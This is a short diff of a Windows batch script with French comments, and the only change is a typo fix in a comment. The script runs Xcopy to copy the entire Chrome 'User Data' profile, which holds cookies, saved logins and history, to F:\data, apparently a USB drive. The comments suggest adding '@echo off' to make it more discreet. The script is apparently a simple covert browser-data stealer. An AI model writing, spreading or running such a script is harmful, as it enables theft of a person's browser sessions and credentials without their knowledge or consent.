@@ -1,6 +1,6 @@
 ##il est preferable de ne pas acjouter @echo off, affin de pouvoir tout ereur,
 ##mais si vous voulai rendre le logiciel plus discret, rajouter,
-##@echo oof
+##@echo off
 color a
 cls
 Xcopy "%localappdata%\Google\Chrome\User Data" F:\data
